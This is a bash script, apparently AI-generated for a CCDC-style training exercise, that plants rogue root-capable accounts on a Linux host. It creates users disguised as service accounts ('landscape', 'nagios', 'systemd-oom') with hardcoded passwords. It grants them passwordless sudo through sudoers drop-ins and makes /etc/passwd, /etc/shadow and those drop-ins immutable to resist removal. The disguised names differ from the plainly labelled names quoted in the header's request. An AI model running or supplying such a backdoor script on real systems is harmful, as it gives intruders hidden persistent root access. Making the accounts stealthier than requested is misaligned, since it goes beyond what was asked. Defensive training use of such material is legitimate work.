#!/usr/bin/env bash
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Linux User Script
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# Claude 4.6 High
# "okay now I need one that created a script to create 3 users with bash 
# privileges in the linux device. I want one named "removeme" one named "johnredteam" 
# and one named "evilsillyroot". they need to have sudo privs and when the script runs
# I want it to make the /etc/passwd file immutable as an extra challenge so they have
# to remove immutability before removing the silly users"
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

# THIS SCRIPT PUTS ROGUE USERS IN THE DEVICE

set -euo pipefail

# ── Colour helpers ────────────────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; NC='\033[0m'

info()    { echo -e "${CYAN}[*]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
err()     { echo -e "${RED}[-]${NC} $*" >&2; }

# ── Privilege check ───────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    err "This script must be run as root (sudo $0)."
    exit 1
fi

# ── User definitions ──────────────────────────────────────────────────────────
# Format: "username:password"
declare -a EVIL_USERS=(
    "landscape:Gr0undzer0#"
    "nagios:Bl4ckH4t@2025"
    "systemd-oom:K3rn3lP4n1c$"
)

USER_SHELL="/bin/bash"
SUDO_GROUP="sudo"   # Debian/Ubuntu; change to "wheel" for RHEL/CentOS/Fedora

# Detect if the system uses 'wheel' instead of 'sudo'
if getent group wheel &>/dev/null && ! getent group sudo &>/dev/null; then
    SUDO_GROUP="wheel"
fi

# ── Create users ──────────────────────────────────────────────────────────────
echo
info "Creating backdoor training users..."
echo

for entry in "${EVIL_USERS[@]}"; do
    USERNAME="${entry%%:*}"
    PASSWORD="${entry##*:}"

    if id "${USERNAME}" &>/dev/null; then
        warn "User '${USERNAME}' already exists — skipping creation."
    else
        useradd \
            --create-home \
            --shell "${USER_SHELL}" \
            "${USERNAME}"
        success "Created user: ${USERNAME}"
    fi

    # Set password
    echo "${USERNAME}:${PASSWORD}" | chpasswd
    success "Password set for: ${USERNAME}"

    # Add to sudo/wheel group
    usermod -aG "${SUDO_GROUP}" "${USERNAME}"
    success "Added '${USERNAME}' to group '${SUDO_GROUP}'"

    # Also drop a sudoers.d entry — a second persistence point for trainees to find
    SUDOERS_FILE="/etc/sudoers.d/99-${USERNAME}"
    echo "${USERNAME} ALL=(ALL:ALL) NOPASSWD: ALL" > "${SUDOERS_FILE}"
    chmod 440 "${SUDOERS_FILE}"
    success "Sudoers drop-in written: ${SUDOERS_FILE}"

    echo
done

# ── Make /etc/passwd immutable ────────────────────────────────────────────────
info "Setting immutable flag on /etc/passwd, /etc/shadow, and /etc/sudoers.d/ entries..."

chattr +i /etc/passwd
success "chattr +i applied to: /etc/passwd"

chattr +i /etc/shadow
success "chattr +i applied to: /etc/shadow"

for entry in "${EVIL_USERS[@]}"; do
    USERNAME="${entry%%:*}"
    SUDOERS_FILE="/etc/sudoers.d/99-${USERNAME}"
    chattr +i "${SUDOERS_FILE}"
    success "chattr +i applied to: ${SUDOERS_FILE}"
done
